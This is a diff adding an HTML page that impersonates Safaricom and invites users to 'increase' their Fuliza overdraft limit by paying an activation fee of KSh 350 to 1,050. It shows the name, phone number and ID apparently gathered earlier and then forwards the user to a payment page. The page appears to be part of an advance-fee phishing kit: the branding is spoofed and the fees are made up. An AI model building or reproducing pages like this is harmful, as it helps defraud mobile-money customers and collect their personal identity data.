@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Select Fuliza Limit</title>
+<link rel="stylesheet" href="style.css">
+<style>
+/* TOP BAR */
+.topbar{
+  background:#1fb141;
+  color:white;
+  padding:15px 20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+.topbar .logo{ font-size:20px; font-weight:bold; }
+.topbar a{ color:white; margin-left:20px; text-decoration:none; }
+
+/* USER CARD */
+.user-card{
+  max-width:650px;
+  margin:25px auto;
+  background:white;
+  padding:20px;
+  border-radius:14px;
+  display:flex;
+  align-items:center;
+  gap:20px;
+  box-shadow:0 6px 18px rgba(0,0,0,0.08);
+  border-left:6px solid #1fb141;
+}
+.profile-icon{
+  font-size:50px;
+  background:#ecf9f0;
+  padding:20px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+.user-details h3{ margin:0; color:#1fb141; font-size:22px; }
+.user-details p{ margin:5px 0; color:#444; font-size:14px; }
+.limit-box{
+  margin-top:10px;
+  background:#1fb141;
+  color:white;
+  padding:10px 15px;
+  border-radius:8px;
+  display:inline-block;
+  font-weight:bold;
+}
+
+/* PAGE TITLE */
+.page-title{ text-align:center; margin-top:30px; }
+.page-title h2{ font-size:26px; margin-bottom:10px; }
+.page-title p{ color:#666; }
+
+/* SERVICE GRID */
+.service-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+  gap:20px;
+  padding:30px;
+  max-width:1000px;
+  margin:auto;
+}
+.service-card{
+  background:white;
+  border-radius:12px;
+  padding:25px;
+  text-align:center;
+  cursor:pointer;
+  border:2px solid #e2e2e2;
+  transition:0.3s;
+  box-shadow:0 4px 10px rgba(0,0,0,0.07);
+}
+.service-card:hover{ transform:translateY(-5px); border-color:#1fb141; }
+.service-card.selected{ border-color:#1fb141; background:#ecf9f0; }
+.limit{ font-size:22px; font-weight:bold; color:#1fb141; margin-bottom:8px; }
+.fee{ font-size:14px; color:#555; }
+
+/* CONTINUE BUTTON */
+.continue-section{ text-align:center; margin:20px; display:none; }
+.continue-btn{
+  background:#1fb141;
+  color:white;
+  border:none;
+  padding:14px 40px;
+  border-radius:30px;
+  font-size:16px;
+  cursor:pointer;
+}
+.continue-btn:hover{ background:#169c37; }
+
+footer{
+  text-align:center;
+  margin-top:30px;
+  padding:15px;
+  color:#666;
+}
+</style>
+</head>
+
+<body>
+
+<header class="topbar">
+  <div class="logo">Safaricom</div>
+  <nav>
+</header>
+
+<!-- USER CARD -->
+<div class="user-card">
+  <div class="profile-icon">👤</div>
+  <div class="user-details">
+    <h3 id="userName">-</h3>
+    <p>Phone: <span id="userPhone">-</span></p>
+    <p>ID: <span id="userID">-</span></p>
+    <div class="limit-box">Current Limit: <span id="userLimit">-</span></div>
+  </div>
+</div>
+
+<div class="page-title">
+  <h2>Select Your Desired Fuliza Limit</h2>
+  <p>Choose the amount limit you want to access. Each limit has its activation fee. It will be updated to your Safaricom number automatically after you completed all Steps.</p>
+</div>
+
+<div class="service-grid">
+  <div class="service-card" data-amount="8000" data-fee="350"><div class="limit">KSh 8,000</div><div class="fee">Activation Fee: KSh 350</div></div>
+  <div class="service-card" data-amount="15000" data-fee="400"><div class="limit">KSh 15,000</div><div class="fee">Activation Fee: KSh 400</div></div>
+  <div class="service-card" data-amount="25000" data-fee="450"><div class="limit">KSh 25,000</div><div class="fee">Activation Fee: KSh 450</div></div>
+  <div class="service-card" data-amount="35000" data-fee="550"><div class="limit">KSh 35,000</div><div class="fee">Activation Fee: KSh 550</div></div>
+  <div class="service-card" data-amount="55000" data-fee="650"><div class="limit">KSh 55,000</div><div class="fee">Activation Fee: KSh 650</div></div>
+  <div class="service-card" data-amount="65000" data-fee="800"><div class="limit">KSh 65,000</div><div class="fee">Activation Fee: KSh 800</div></div>
+  <div class="service-card" data-amount="75000" data-fee="900"><div class="limit">KSh 75,000</div><div class="fee">Activation Fee: KSh 900</div></div>
+  <div class="service-card" data-amount="85000" data-fee="1050"><div class="limit">KSh 85,000</div><div class="fee">Activation Fee: KSh 1050</div></div>
+</div>
+
+<div class="continue-section" id="continueBox">
+  <button class="continue-btn" onclick="continuePayment()">Continue</button>
+</div>
+
+<footer>© 2026 Safaricom Fuliza Increase</footer>
+
+<script>
+let name = localStorage.getItem("userName")
+let phone = localStorage.getItem("userPhone")
+let id = localStorage.getItem("userID")
+let limit = localStorage.getItem("currentLimit")
+
+document.getElementById("userName").innerText = name
+document.getElementById("userPhone").innerText = phone
+document.getElementById("userLimit").innerText = "KSh "+ (limit !== null ? limit : 0)
+
+if(id){
+  let first=id.substring(0,2)
+  let last=id.substring(id.length-2)
+  document.getElementById("userID").innerText = first+"****"+last
+}
+
+let selectedAmount=null
+let selectedFee=null
+document.querySelectorAll(".service-card").forEach(card=>{
+  card.addEventListener("click",function(){
+    document.querySelectorAll(".service-card").forEach(c=>c.classList.remove("selected"))
+    this.classList.add("selected")
+    selectedAmount=this.dataset.amount
+    selectedFee=this.dataset.fee
+    document.getElementById("continueBox").style.display="block"
+  })
+})
+function continuePayment(){
+  localStorage.setItem("selectedAmount", selectedAmount)
+  localStorage.setItem("activationFee", selectedFee)
+  window.location.href="payment1.html"
+}
+</script>
+</body>
+</html>
